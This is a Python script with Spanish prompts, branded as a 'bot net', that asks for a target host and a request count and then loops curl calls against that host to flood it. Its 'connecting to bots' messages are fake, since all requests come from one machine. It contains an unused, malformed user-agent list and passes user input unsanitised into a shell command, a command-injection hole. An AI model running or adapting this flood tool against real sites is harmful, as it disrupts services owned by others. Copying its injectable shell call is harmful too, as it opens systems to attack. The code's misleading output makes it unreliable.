from os import system
import time
from colorama import Fore

user_agents={
    
    "Opera/9.61.(X11; Linux x86_64; az-IN) Presto/2.9.190 Version/12.00"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/5.0)"
    
    "Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; ht-HT) AppleWebKit/532.19.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6532.19.2"
    
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/535.0 (KHTML, like Gecko) FxiOS/17.3h5139.0 Mobile/16K097 Safari/535.0"
    
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows 98; Trident/5.1)"
}



system("clear")
print(Fore.YELLOW+"""

░█████╗░░██████╗████████╗██████╗░░█████╗░██╗░░░░░░█████╗░░██████╗░██╗░█████╗░
██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔══██╗██╔════╝░██║██╔══██╗
███████║╚█████╗░░░░██║░░░██████╔╝██║░░██║██║░░░░░██║░░██║██║░░██╗░██║██║░░╚═╝
██╔══██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║██║░░░░░██║░░██║██║░░╚██╗██║██║░░██╗
██║░░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝███████╗╚█████╔╝╚██████╔╝██║╚█████╔╝
╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░╚════╝░
"""
)

print(Fore.BLUE+"██████╗░░█████╗░████████╗"+Fore.RED+" ███╗░░██╗███████╗████████╗")
print(Fore.BLUE+"██╔══██╗██╔══██╗╚══██╔══╝"+Fore.RED+" ████╗░██║██╔════╝╚══██╔══╝")
print(Fore.BLUE+"██████╦╝██║░░██║░░░██║░░░"+Fore.RED+" ██╔██╗██║█████╗░░░░░██║░░░")
print(Fore.BLUE+"██╔══██╗██║░░██║░░░██║░░░"+Fore.RED+" ██║╚████║██╔══╝░░░░░██║░░░")
print(Fore.BLUE+"██████╦╝╚█████╔╝░░░██║░░░"+Fore.RED+" ██║░╚███║███████╗░░░██║░░░")
print(Fore.BLUE+"╚═════╝░░╚════╝░░░░╚═╝░░░"+Fore.RED+" ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░")


sitio=input(Fore.WHITE+"Ingresa el IP, Host: ")
treads=input("Ingresa el numero de solicitudes, default(500)\n---> ")
print (Fore.WHITE+"Codigo de respuesta http "+Fore.RED+"404")

code_response=input(Fore.WHITE+"Deseas cambiar el Codigo de respuesta?"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n---> ")

if code_response == "y":
    actual_code=input("Ingresa una ruta valida para la pagina web\n"+Fore.BLUE+"Example:"+Fore.WHITE+" Index.html"+"---> ")
    time.sleep(2)
    print("Conectando a los bots...")
    time.sleep(2)
    print("Conexion aceptada...")
    time.sleep(2)
    print("Enviando solicitudes...")
    time.sleep(2)
    if treads == "":
        for i in range(500):
            system("curl -s -o /dev/null "+sitio+"/"+ actual_code)
        print("Conexion terminada...")
    
    else:
        for i in range(int(treads)):
            system("curl -s -o /dev/null "+sitio+"/"+actual_code)
        print("Conexion terminada...")
        

if code_response == "n":
    print("Conectando a los bots...")
    time.sleep(2)
    print("Conexion aceptada...")
    time.sleep(2)
    print("Enviando solicitudes...")
    time.sleep(2)
    if treads == "":
        for i in range(500):
            system("curl -s -o /dev/null "+sitio+"/hack-74lg0-for-educational-use")
        print("Conexion terminada...")
            
    else:
        for i in range(int(treads)):
            system("curl -s -o /dev/null "+sitio+"/hack-74lg0-for-educational-use")
        print("Conexion terminada...")
